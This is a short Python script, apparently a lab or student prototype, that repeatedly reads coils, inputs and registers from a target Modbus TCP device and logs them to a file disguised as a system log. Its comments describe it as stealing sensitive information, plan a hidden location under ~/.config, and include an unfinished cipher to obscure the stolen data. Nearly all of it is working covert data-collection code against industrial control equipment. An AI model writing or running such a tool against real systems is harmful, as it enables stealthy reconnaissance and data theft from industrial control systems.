from datetime import datetime, timedelta
import os
import sys
import time
from pymodbus.client.tcp import ModbusTcpClient

#Take the target IP address as the only parameter for this program
ip = sys.argv[1]

def main():
    #Create a false log file

    #If the file name does not currently exist; TESTING WITH EASY-TO-ACCESS FILE
    if not os.path.exists("./testSyslog"):
        #f = open("~/.config/syslogs", "x")

        with open("./testSyslog", "x") as f:
            while 1:
                #Set the next execution to occur in one hour; TESTING WITH TEN SECONDS
                nextEx = datetime.now() + timedelta(seconds=10)

                #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO            
                # f.write(encryptInfo(stealInfo()))
                f.write(stealInfo())

                #Have the program sleep and wait for its designated time to execute
                while datetime.now() < nextEx:
                    time.sleep(1)
    #If the file name already exists
    else:
        #Append to the existing file; TESTING WITH EASY-TO-ACCESS FILE
        #f = open("~/.config/syslogs","a")
        
        with open("./testSyslog","a") as f:
            while 1:
                #Set the next execution to occur in one hour; TESTING WITH TEN SECONDS
                nextEx = datetime.now() + timedelta(seconds=10)

                #DO THE MODBUS WRITING IN HERE TO WITHDRAW SENSITIVE INFO
                #f.write(encryptInfo(stealInfo()))
                f.write(stealInfo())

                #Have the program sleep and wait for its designated time to execute
                while datetime.now() < nextEx:
                    time.sleep(1)
        

def stealInfo():
    #Set current targeted device
    curClient = ModbusTcpClient(ip,port="5502")

    #Collect info from the server's registers; adjust COUNT to collect from more registers
    coilInfo = curClient.read_coils(address=0,count=10)
    discInputInfo = curClient.read_discrete_inputs(address=0,count=10)
    holdRegisterInfo = curClient.read_holding_registers(address=0,count=10)
    inpRegisterInfo = curClient.read_input_registers(address=0,count=10)

    clientInfo = f"{datetime.now()}:\n\tCoils = {coilInfo}\n\tDiscrete Inputs = {discInputInfo}\n\tHolding Registers = {holdRegisterInfo}\n\tInput Registers = {inpRegisterInfo}\n\n"

    #Return the extracted data
    return clientInfo

#Basic Caesar Cipher, more secure encryption can be implemented at attacker's will
#FINISH IMPLEMENTING
# def encryptInfo(info):
#     info = info.lower()
#     newInfo = ''
#     for i in range(len(info)):
#        newInfo += chr((ord(info[i]) - 90) % 26 + 97)

#     #Return the encrypted data
#     return newInfo

main()
